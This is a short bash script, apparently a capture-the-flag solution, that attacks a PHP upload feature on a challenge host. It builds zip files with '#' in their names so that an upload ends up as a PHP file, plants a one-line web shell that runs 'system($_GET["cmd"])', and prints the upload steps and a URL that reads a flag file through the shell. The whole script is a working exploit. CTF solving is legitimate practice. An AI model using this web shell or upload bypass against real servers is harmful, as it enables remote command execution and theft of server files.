#!/bin/bash

read -p "zip name: " ZIP_NAME

echo "dummy (sth useless)" > asdf
echo "dummy (sth useless)" > idk.php
echo '<?php echo system($_GET["cmd"]); ?>' > i.zip\#idk.php

zip $ZIP_NAME.zip i.zip\#idk.php
zip $ZIP_NAME.zip\#i.zip idk.php
zip $ZIP_NAME.zip\#i.zip -u asdf

CHALL_HOST="http://chal.polyuctf.com:41341"
URL="$CHALL_HOST/uploads/$ZIP_NAME.zip%23i/idk.php?cmd=cat+/var/www/html/flag.php|base64"
echo "Upload $ZIP_NAME.zip twice"
echo "Upload $ZIP_NAME.zip#i.zip once"
echo "Then visit $URL"
